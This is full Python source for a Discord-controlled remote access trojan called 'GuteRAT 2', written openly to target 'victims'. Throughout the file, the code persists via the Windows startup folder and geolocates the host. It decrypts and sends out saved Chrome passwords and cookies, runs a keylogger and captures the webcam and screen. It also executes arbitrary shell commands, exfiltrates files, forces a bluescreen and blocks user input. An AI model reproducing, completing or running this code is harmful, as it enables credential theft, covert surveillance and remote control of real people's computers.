import discord, discord.ext, os , time, pyautogui, json, base64, sqlite3, win32crypt, shutil, httpx, sys, ctypes
clear = lambda: os.system('cls')
from discord.ext import commands
from Crypto.Cipher import AES
from datetime import datetime, timedelta
login = os.getlogin()
loginname = login.title()
import base64, os
from pynput.keyboard import Listener
import logging
from discord import Intents
import requests, pathlib, keyboard, mouse, threading, subprocess, platform, psutil
from getmac import get_mac_address as gma
import comtypes, win32com.client as wincl, pygame, pygame.camera

TOKEN = ""
main_guild_id = [] # remove the brackets when putting your guild id

activity=discord.Game("I can't code for shit")
client = commands.Bot(command_prefix = 'g!', Intents=Intents.default() , case_insensitive=True, activity=activity, status=discord.Status.idle)
client.remove_command('help')
login = os.getlogin()
loginname = os.getlogin()

def add_to_startup(file_path=""):
    temp = os.getenv("TEMP")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
    if file_path == "":
        file_path = sys.argv[0]
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


colour = 0xFFA500

@client.event
async def on_ready():
    await client.wait_until_ready()
    guild = client.get_guild(main_guild_id)
    channel = discord.utils.get(guild.text_channels, name=f'{login}')
    OperatingSystem = platform.system()
    OSRelease = platform.release()
    if OSRelease == "10":
        OSRelease = "10 / 11"
    OSVersion = platform.version()
    ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
    disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
    if disk == 1 or disk == 2 or disk == 3 or disk == 4:
        gbortb = "TB"
    else:
        gbortb = "GB"

    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            region = data.get('region')
            loc = data.get('loc')
            org = data.get('org')

    hwid = str(str(subprocess.check_output('wmic csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
    embed = discord.Embed(
        title="Victim Reconnected",
        description=f"We are currently connected to {loginname.title()} from {city}, {region}.",
        colour = colour
    )
    if not channel:
        await guild.create_text_channel(name=f"{login}")
        embed = discord.Embed(
        title="New Victim",
        description=f"We are currently connected to {loginname.title()} from {city}, {region}.",
        colour = colour
        )

    embed.add_field(name=f"\u2800", value="**PC Info**", inline=False)
    embed.add_field(name=f"Operating System", value=f"{OperatingSystem} {OSRelease}")
    embed.add_field(name="RAM", value=f"{ram} GB")
    embed.add_field(name="Disk Space", value=f"{disk} {gbortb}")
    embed.add_field(name="HWID", value=f"{hwid}", inline=False)

    embed.add_field(name=f"\u2800", value="**Internet Connection Info**", inline=False)
    embed.add_field(name=f"MAC Address", value =f"{gma()}")
    embed.add_field(name=f"IP Address", value =f"{ip}")
    embed.add_field(name=f"ISP", value =f"{org}", inline=False)
    embed.add_field(name=f"---------------------------------------------------------------------------------", value=f"Type `g!help` for a list of commands!", inline=False)
    embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/dacianfan 🌟")
    channel = discord.utils.get(guild.text_channels, name=f'{login}')

    await channel.purge(limit=10000)
    await channel.send("||@here||", embed=embed)
    add_to_startup()

@client.command()
async def webcam(ctx):
    if ctx.channel.name == f"{login}":
        temp = os.getenv("TEMP")
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        pygame.camera.init()
        camlist = pygame.camera.list_cameras()
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            time.sleep(2)
            image = cam.get_image()
            pygame.image.save(image, f"{temp}\\webcamSS.jpg")
            await ctx.reply(file=discord.File(f"{temp}\\webcamSS.jpg"))
        else:
            await ctx.reply(f"Victim likely has no webcam. :(")
    else:
        return
    
@client.command()
async def screenshot(ctx):
    temp = os.getenv("TEMP")
    if ctx.channel.name == f"{login}":
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(f"{temp}\\MonitorScreenshot.png")
        screenshot = f"{temp}\\MonitorScreenshot.png"
        await ctx.reply(file=discord.File(screenshot))
        os.remove(f"{temp}\MonitorScreenshot.png")
    else:
        return

def chrome_date_and_time(chrome_data):

    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():

    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main():
    key = fetching_encryption_key()
    temp = os.getenv("TEMP")
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = (f"{temp}\\ChromeDB.db")
    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            
            with open(f"{temp}\\passwords.txt", "a", encoding='utf-8', errors = 'ignore') as o:
                o.write(f'==================================================================================================================================================== \n')   
                o.write(f'URL: {main_url} \n')
                o.write(f'User name: {user_name} \n')
                o.write(f'Password: {decrypted_password} \n')    
          
        else:
            continue

    with open(f"{temp}\\passwords.txt", "a") as o:
                if date_of_creation != 86400000000 and date_of_creation:
                    o.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))} \n")
                if last_usuage != 86400000000 and last_usuage:    
                    o.write(f"Last Used: {str(chrome_date_and_time(last_usuage))} \n")
                o.close()


@client.command()
async def ipinfo(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
                data = req.json()
                ip = data.get('ip')
                city = data.get('city')
                country = data.get('country')
                region = data.get('region')
                loc = data.get('loc')
                hostname = data.get('hostname')
                postal = data.get('postal')
                org = data.get('org')
                googlemaps = "<https://www.google.com/maps/search/google+map++" + loc + ">"
                
        if country == "US":
            RegionOrState = "State"
        else:
            RegionOrState = "Region"

        embed = discord.Embed(
            title="IP Info",
            colour = colour
        )

        embed.add_field(name="ISP", value=f"{org}", inline=False)
        embed.add_field(name="Hostname", value=f"{hostname}", inline=False)
        embed.add_field(name="City", value=f"{city}, {postal}", inline=False)
        embed.add_field(name="Country", value=f"{country}", inline=False)
        embed.add_field(name=f"{RegionOrState}", value=f"{region}", inline=False)
        embed.add_field(name="Google Maps", value=f"{googlemaps}", inline=False)
        embed.set_footer(text=f"🌟 GuteRAT 2 - Author: Gute Nacht - https://github.com/dacianfan 🌟")
        await ctx.reply(embed=embed)
    else:
        return

@client.command()
async def cmd(ctx, *, cmd):
    if ctx.channel.name == f"{login}":
        temp = os.getenv("TEMP")
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        returned_text = subprocess.check_output(f"{cmd}", shell=True, universal_newlines=True)
        returned_text = str(returned_text)
        info = (returned_text[:1997] + '...') if len(returned_text) > 75 else returned_text
        if len(returned_text) > 1:
            await ctx.reply(info)
        else:
            pass
        await ctx.reply("Command ran succesfully!")
    else:
        return

@client.command()
async def write(ctx, *, input):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        pyautogui.write(f'{input}')
    else:
        return

@client.command()
async def error(ctx, *, cmd):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        ctypes.windll.user32.MessageBoxW(0, f"{cmd}", f"Error", 0)
        await ctx.reply(f"Error {cmd} successfully sent and closed by user!")
    else:
        return

@client.command()
async def startkeylog(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        temp = os.getenv("TEMP")
        log_dir = temp
        logging.basicConfig(filename=(log_dir + r"\key_log.txt"),
                            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def keylog():
            def on_press(key):
                logging.info(str(key))
            with Listener(on_press=on_press) as listener:
                listener.join()
        import threading
        global test
        test = threading.Thread(target=keylog)
        test._running = True
        test.daemon = True
        test.start()
        await ctx.reply("Keylogger started successfully!")
    else:
        return

@client.command()
async def stopkeylog(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        test._running = False
        await ctx.reply("Keylogger stopped successfully!")    
    else:
        return

@client.command()
async def dumpkeylog(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        temp = os.getenv("TEMP")
        file_keys = temp + r"\key_log.txt"
        file = discord.File(file_keys, filename="key_log.txt")
        await ctx.reply("Keylog successfully dumped!", file=file)
        os.remove(file_keys)
    else:
        return

@client.command()
async def clearchat(ctx):
    await ctx.channel.purge(limit=1000)
    await ctx.send("Cleared chat!", delete_after = 1)

def get_chrome_datetime1(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key1():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data1(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""


def main1():
    temp = os.getenv("TEMP")
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    filename = f"{temp}\\Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    key = get_encryption_key1()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data1(encrypted_value, key)
        else:
            decrypted_value = value
        with open(f"{temp}\\cookies.txt", "a", encoding='utf-8', errors = 'ignore') as o:
            o.write(f"Host: {host_key}\n")
            o.write(f"Cookie name: {name}\n")
            o.write(f"Cookie value (decrypted): {decrypted_value}\n")
            o.write(f"Creation datetime (UTC): {get_chrome_datetime1(creation_utc)}\n")
            o.write(f"Last access datetime (UTC): {get_chrome_datetime1(last_access_utc)}\n")
            o.write(f"Expires datetime (UTC): {get_chrome_datetime1(expires_utc)}\n")
            o.write(f"===============================================================\n")
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    db.commit()
    db.close()

@client.command()
async def chromedata(ctx):
    temp = os.getenv("TEMP")
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = 0.1)
        main()
        main1()
        passwords = f"{temp}\\passwords.txt"
        cookies = f"{temp}\\cookies.txt"
        localstatepath = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        logindatapath = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
        await ctx.reply(f"{localstatepath}\n{logindatapath}", file=discord.File(passwords))
        cookiespath = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        await ctx.reply(cookiespath, file=discord.File(cookies))
        os.remove(passwords)
        os.remove(cookies)
        
    else:
        return

@client.command()
async def upload(ctx, *, url):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        r = requests.get(url)
        suffix = pathlib.Path(url).suffix
        print(suffix)
        temp = os.getenv("TEMP")
        try:
            with open(f'{temp}\\downloaded{suffix}', 'wb') as f:
                    f.write(r.content)

            await ctx.reply(f"Downloaded! File located at `{temp}\\downloaded{suffix}`")
        except Exception as e:
            await ctx.reply(e)
    else: 
        return

@client.command()
async def bluescreen(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... If there is no reply past this it was successful.", delete_after = .1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await ctx.reply("Bluescreen successful!")
        else:
            await ctx.reply("Bluescreen failed! :(")
    else:
        return

global executing
executing = True

def inputblock():
    for i in range(150):
            keyboard.block_key(i)
    global executing
    while executing:
        mouse.move(1,0, absolute=True, duration=0)
    else:
        return

def inputunblock():
        global executing
        executing = False
        for i in range(150):
            keyboard.block_key(i)

@client.command()
async def blockinput(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        threading.Thread(target=inputblock).start()
        await ctx.reply("Input has been blocked!")
    else:
        return

@client.command()
async def unblockinput(ctx):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        threading.Thread(target=inputunblock).start()
        await ctx.reply("Input has been unblocked!")
    else:
        return

@client.command()
async def kill(ctx, *, session):
    if session == login:
        await ctx.reply(f"Session {login} closed!")
        sys.exit()
    else:
        return

@client.command()
async def killall(ctx):
    await ctx.reply(f"All active sessions closed!")

@client.command()
async def download(ctx, *, path):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        await ctx.reply("File successfully grabbed!", file=discord.File(path))
    else:
        return

@client.command()
async def locate(ctx, *, name):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .1)
        split = os.path.splitext(name)
        file_name = split[0]
        file_extension = split[1]
        searchname = file_name + "*" + file_extension
        command = f'dir "\\{searchname}" /s'
        try:
            returned_text = subprocess.check_output(f"{command}", shell=True, universal_newlines=True)
            await ctx.reply(returned_text)
        except Exception as e:
            await ctx.reply(e)
    else:
        return

@client.command()
async def help(ctx, args=None):
    help_embed = discord.Embed(title="Commands List", colour=colour)
    command_names_list = [x.name for x in client.commands]
    helpargs = []
    if args == "help":
        helpargs = "Displays help command\nSyntax: g!help"
    elif args == "error":
        helpargs = "Displays error message to victim's screen\nSyntax: g!error example"
    elif args == "startkeylog":
        helpargs = "Starts keylogger\nSyntax: g!g!startkeylog"
    elif args == "stopkeylog":
        helpargs = "Stops keylogger\nSyntax: g!stopkeylog"
    elif args == "dumpkeylog":
        helpargs = "Dumps keylogger data\nSyntax: g!dumpkeylog"
    elif args == "clearchat":
        helpargs = "Clears your channel\nSyntax: g!clearchat"
    elif args == "chromedata":
        helpargs = "Displays all Google Chrome data\nSyntax: g!chromedata"
    elif args == "upload":
        helpargs = "Uploads file to victim's machine (MUST BE DISCORD LINK TO WORK)\nSyntax: g!upload https:/\/cdn.discordapp.com/unknown.png"
    elif args == "bluescreen":
        helpargs = "Bluescreen's victim's machine\nSyntax: g!bluescreen"
    elif args == "blockinput":
        helpargs = "Blocks victim's input\nSyntax: g!blockinput"
    elif args == "unblockinput":
        helpargs = "Unblocks victim's input\nSyntax: g!unblockinput"
    elif args == "kill":
        helpargs = "Kills RAT for select victim\n*Syntax: g!kill User*"
    elif args == "webcam":
        helpargs = "Takes screenshot of victim's webcam (if victim's webcam is connected)\n*Syntax: g!webcam*"
    elif args == "killall":
        helpargs = "Kills ALL active sessions\n*Syntax: g!killall*"
    elif args == "ipinfo":
        helpargs = "Gathers info about victim's IP address\n*Syntax: g!ipinfo*"
    elif args == "download":
        helpargs = "Downloads selected file from victim's machine\n*Syntax: g!download C:\\Users\\User\\Desktop\\unknown.png*"
    elif  args == "cmd":
        helpargs = "Runs command on victim's machine\n*Syntax: g!cmd start chrome.exe*"
    elif args == "locate":
        helpargs = "Locate file on victim's machine\n*Syntax: g!locate unknown.png*"
    elif args == "write":
        helpargs = "Types selected text on victim's machine\n*Syntax: g!write example*"    
    elif args == "checktask":
        helpargs = "Checks if task is running on victim's machine\n*Syntax: g!checktask code.exe*"
    elif args == "admincheck":
        helpargs = "Checks if program was run as administrator\n*Syntax: g!admincheck*"
    elif args == "speak":
        helpargs = "Speaks selected text through victim's headphones\nSyntax: g!speak example message"
    elif args == "wallpaper":
        helpargs = "Sets victim's wallpaper to specified url (MUST BE DISCORD LINK TO WORK)\nSyntax: g!wallpaper https:/\/cdn.discordapp.com/unknown.png"
    else:
        helpargs = "Invalid input! Try again?"

    if not args:
        help_embed.add_field(
            name="List of supported commands:",
            value="\n".join([str(i+1)+". "+x.name for i,x in enumerate(client.commands)]),
            inline=False
        )
        help_embed.add_field(
            name="Details",
            value="Type `g!help <command name>` for more details about each command.",
            inline=False
        )
    else:
        help_embed.add_field(
            name=args,
            value=helpargs
        )

    await ctx.reply(embed=help_embed)

@client.command()
async def checktask(ctx, *, task):
    if ctx.channel.name == f"{login}":
        task2 = task.title()
        tasklist = subprocess.check_output(f"tasklist", shell=True, universal_newlines=True)
        if task or task2 in tasklist:
            await ctx.reply(f"Task {task} found running on {login}'s machine!")
        else:
            await ctx.reply(f"Task {task} not found running on {login}'s machine!")
    else:
        return

@client.command()
async def admincheck(ctx):
    if ctx.channel.name == f"{login}":
        administrator = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if administrator:
            await ctx.reply("Program was run as administrator!")
        elif not administrator:
            await ctx.reply("Unfortunately, your program was not run as administrator :(")
    else:
        return

@client.command()
async def speak(ctx, *, message):
    if ctx.channel.name == f"{login}":
        voice = wincl.Dispatch("SAPI.SpVoice")
        await ctx.reply("Currently speaking...", delete_after = .01)
        voice.Speak(message)
        comtypes.CoUninitialize()
        await ctx.reply("Command ran succesfully!")
    else:
        return
    
@client.command()
async def wallpaper(ctx, *, url):
    if ctx.channel.name == f"{login}":
        await ctx.reply("Attempting... Please wait.", delete_after = .01)
        r = requests.get(url)
        suffix = pathlib.Path(url).suffix
        temp = os.getenv("TEMP")
        with open(f'{temp}\\wallpaperfile{suffix}', 'wb') as f:
                f.write(r.content)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{temp}\\wallpaperfile{suffix}" , 0)
        await ctx.reply("Wallpaper Set! Command ran successfully!")
    else:
        return

client.run(TOKEN)
